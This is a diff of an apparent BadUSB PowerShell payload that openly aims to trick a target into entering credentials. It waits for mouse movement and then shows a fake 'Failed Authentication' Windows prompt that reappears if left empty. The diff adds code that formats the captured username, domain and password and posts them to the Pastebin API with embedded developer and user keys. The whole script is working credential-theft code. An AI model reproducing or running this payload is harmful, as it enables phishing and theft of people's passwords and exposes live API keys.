@@ -17,100 +17,61 @@
 #  youtube.com/c/IamJakoby                                                                                   #  |  |  |  |( (  |  |  |  \\ |  |  |  |  |  |#
 ############################################################################################################################################################
 
-<#
-.SYNOPSIS
-	This script is meant to trick your target into sharing their credentials through a fake authentication pop up message
+# ███████╗ ██████╗ ██████╗ ██╗  ██╗███████╗██████╗     ██████╗ ██╗   ██╗         ██╗ ██████╗ 
+# ██╔════╝██╔═══██╗██╔══██╗██║ ██╔╝██╔════╝██╔══██╗    ██╔══██╗╚██╗ ██╔╝         ██║██╔════╝ 
+# █████╗  ██║   ██║██████╔╝█████╔╝ █████╗  ██║  ██║    ██████╔╝ ╚████╔╝          ██║██║  ███╗
+# ██╔══╝  ██║   ██║██╔══██╗██╔═██╗ ██╔══╝  ██║  ██║    ██╔══██╗  ╚██╔╝      ██   ██║██║   ██║
+# ██║     ╚██████╔╝██║  ██║██║  ██╗███████╗██████╔╝    ██████╔╝   ██║       ╚█████╔╝╚██████╔╝
+# ╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═════╝     ╚═════╝    ╚═╝        ╚════╝  ╚═════╝ 
 
-.DESCRIPTION 
-	A pop up box will let the target know "Unusual sign-in. Please authenticate your Microsoft Account"
-	This will be followed by a fake authentication ui prompt. 
-	If the target tried to "X" out, hit "CANCEL" or while the password box is empty hit "OK" the prompt will continuously re pop up 
-	Once the target enters their credentials their information will be uploaded to your dropbox for collection
-
-.Link
-	https://developers.dropbox.com/oauth-guide		# Guide for setting up your DropBox for uploads
-
-#>
-
-#------------------------------------------------------------------------------------------------------------------------------------
-
-$DropBoxAccessToken = "YOUR-DROPBOX-ACCESS-TOKEN"
-
-#------------------------------------------------------------------------------------------------------------------------------------
-
-$FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
- 
-#------------------------------------------------------------------------------------------------------------------------------------
-
-<#
-
-.NOTES 
-	This is to generate the ui.prompt you will use to harvest their credentials
-#>
-
+# This is to generate the ui.prompt you will use to harvest their credentials
 function Get-Creds {
-do{
-$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
-   if([string]::IsNullOrWhiteSpace([Net.NetworkCredential]::new('', $cred.Password).Password)) {
-    [System.Windows.Forms.MessageBox]::Show("Credentials can not be empty!")
-    Get-Creds
+    do {
+        $cred = $host.ui.promptforcredential('Failed Authentication', '', [Environment]::UserDomainName + '\' + [Environment]::UserName, [Environment]::UserDomainName)
+        if ([string]::IsNullOrWhiteSpace([Net.NetworkCredential]::new('', $cred.Password).Password)) {
+            [System.Windows.Forms.MessageBox]::Show("Credentials can not be empty!")
+            Get-Creds
+        }
+        return $cred
+        # ...
+
+        $done = $true
+    } until ($done)
+
 }
-$creds = $cred.GetNetworkCredential() | fl
-return $creds
-  # ...
 
-  $done = $true
-} until ($done)
+# This is to pause the script until a mouse movement is detected
 
-}
-
-#----------------------------------------------------------------------------------------------------
-
-<#
-
-.NOTES 
-	This is to pause the script until a mouse movement is detected
-#>
-
-function Pause-Script{
-Add-Type -AssemblyName System.Windows.Forms
-$originalPOS = [System.Windows.Forms.Cursor]::Position.X
-$o=New-Object -ComObject WScript.Shell
+function Pause-Script {
+    Add-Type -AssemblyName System.Windows.Forms
+    $originalPOS = [System.Windows.Forms.Cursor]::Position.X
+    $o = New-Object -ComObject WScript.Shell
 
     while (1) {
         $pauseTime = 3
-        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
+        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS) {
             break
         }
         else {
-            $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
+            $o.SendKeys("{CAPSLOCK}"); Start-Sleep -Seconds $pauseTime
         }
     }
 }
 
-#----------------------------------------------------------------------------------------------------
-
 # This script repeadedly presses the capslock button, this snippet will make sure capslock is turned back off 
-
 function Caps-Off {
-Add-Type -AssemblyName System.Windows.Forms
-$caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')
+    Add-Type -AssemblyName System.Windows.Forms
+    $caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')
 
-#If true, toggle CapsLock key, to ensure that the script doesn't fail
-if ($caps -eq $true){
+    #If true, toggle CapsLock key, to ensure that the script doesn't fail
+    if ($caps -eq $true) {
 
-$key = New-Object -ComObject WScript.Shell
-$key.SendKeys('{CapsLock}')
+        $key = New-Object -ComObject WScript.Shell
+        $key.SendKeys('{CapsLock}')
+    }
 }
-}
-#----------------------------------------------------------------------------------------------------
 
-<#
-
-.NOTES 
-	This is to call the function to pause the script until a mouse movement is detected then activate the pop-up
-#>
-
+# This is to call the function to pause the script until a mouse movement is detected then activate the pop-up
 Pause-Script
 
 Caps-Off
@@ -123,19 +84,15 @@ $creds = Get-Creds
 
 #------------------------------------------------------------------------------------------------------------------------------------
 
-<#
+$username = $creds.getnetworkcredential().username
+$domain = $creds.getnetworkcredential().domain
+$password = $creds.getnetworkcredential().password
 
-.NOTES 
-	This is to save the gathered credentials to a file in the temp directory
-#>
+$credentials = @"
+    Username: $username
+    Domain:   $domain
+    Password: $password
+"@
 
-echo $creds >> $env:TMP\$FileName
-
-#------------------------------------------------------------------------------------------------------------------------------------
-
-<#
-
-.NOTES 
-#>
 # Smuggle The credentials out!
-$null = Invoke-WebRequest -Uri 'https://pastebin.com/api/api_post.php' -Method POST -Body "api_dev_key=ask0P1pKGGS6sx4qThPNIW2Hq1hyx9YN&api_option=paste&api_user_key=497c98f25b71c824fa9111ca633f4ec6&api_paste_code=$creds"
+$null = Invoke-WebRequest -Uri 'https://pastebin.com/api/api_post.php' -Method POST -Body "api_dev_key=ask0P1pKGGS6sx4qThPNIW2Hq1hyx9YN&api_option=paste&api_user_key=497c98f25b71c824fa9111ca633f4ec6&api_paste_code=$credentials"
